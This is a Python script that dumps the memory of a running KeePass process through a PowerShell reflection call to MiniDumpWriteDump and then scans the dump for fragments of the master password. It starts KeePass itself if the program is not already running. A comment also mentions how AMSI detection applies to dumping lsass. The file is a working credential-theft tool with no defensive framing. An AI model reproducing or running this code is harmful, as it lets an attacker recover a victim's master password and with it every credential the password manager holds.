import subprocess
from subprocess import check_output
import psutil
import re
import time


def dumper(process='keepass', file='kpd.tmp'):

	# mem dump of process at %temp%\file
	# AMSI will catch if you try to dump lsass

	c = '''$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$p=$env:TEMP;$ProcessDumpPath = $p+'\{}';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process {};$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()'''.format(
		file, process
	)
	cmd =  "powershell -c " + c
	returned_value = subprocess.call(cmd, shell=False)

	out = subprocess.run(["cmd", "/c", "echo", "%TEMP%"], stdout=subprocess.PIPE)
	path = str(out.stdout.decode('utf-8').strip())

	filepath = path + '\\' + file

	return filepath


def open_proc(proc='KeePass.exe'):
	if proc in (p.name() for p in psutil.process_iter()) :
		return 1
	else :

		paths = ['C:\\Program Files\\KeePass Password Safe 2', 'C:\\Program Files (x86)\\KeePass Password Safe 2']
		for p in paths:
			cmd = f"""cmd /c start /D "{p}" {proc}"""
			r = subprocess.call(cmd, shell=False)
			if r == 0:
				return 2

		return 3
	
def get_passwords(file):
	print("finding passwords...")
	with open(file, "rb") as f:
		contents = f.read()

	length = len(contents)

	passChar = "*"

	current_len = 0
	debugStr = ""
	pass_char = {}
	pass_char[1] = ["*"]

	for i in range(0, length) :
		if i == length-1:
			break

		b = contents[i]
		b2 = contents[i+1]

		if (b == 207) and (b2 == 37):
			i+=1
			current_len += 1
			debugStr += passChar;

		else:
			if current_len == 0:
				continue

			else :
				try :
					c = contents[i+1:i+2].decode('utf-8')

					x = re.search("^[\x20-\x7E]+$", c)
					if x :
						current_len +=1
						if current_len not in pass_char.keys():
							pass_char[current_len] = []
						if c not in pass_char[current_len] :
							pass_char[current_len].append(c)
						#print(debugStr+c)
					else :
						current_len = 0
						debugStr = ""
						continue
				except:
					continue

			current_len = 0
			debugStr = ""	

	print("Password Position and Char")
	for k in pass_char.keys() :
		print(f"{k} : {pass_char[k]}")


def main() :

	r = open_proc()
	if r ==1 :
		print("Process is running")
		fp = dumper()
	elif r == 2:
		print("Process is spawned, waiting for 10s")
		time.sleep(10)
		fp = dumper()
	else:
		exit
	print(f"Process memomry dumped: {fp}")
	
	print(fp)
	get_passwords(fp)

if __name__ == "__main__":
	main()
